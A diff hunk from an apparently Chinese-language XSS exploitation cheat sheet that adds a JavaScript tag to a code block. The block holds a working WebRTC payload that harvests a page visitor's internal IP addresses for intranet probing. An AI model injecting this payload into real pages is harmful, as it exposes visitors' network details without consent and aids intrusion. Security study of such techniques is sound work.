@@ -545,7 +545,7 @@ XSS proxy - 与XSS受害者的浏览器实时交互.  工具 [JShell](https://gi
 #### XSS利用方式 - 探测内网
 
 利用实时通信标准WebRTC 获取访问者内网IP demo:
-```
+```JavaScript
 var findIP = new Promise(r=>{var w=window,a=new (w.RTCPeerConnection||w.mozRTCPeerConnection||w.webkitRTCPeerConnection)({iceServers:[]}),b=()=>{};a.createDataChannel("");a.createOffer(c=>a.setLocalDescription(c,b,b),b);a.onicecandidate=c=>{try{c.candidate.candidate.match(/([0-9]{1,3}(\.[0-9]{1,3}){3}|[a-f0-9]{1,4}(:[a-f0-9]{1,4}){7})/g).forEach(r)}catch(e){}}})
 
 // Show the Intranet IP using alert()
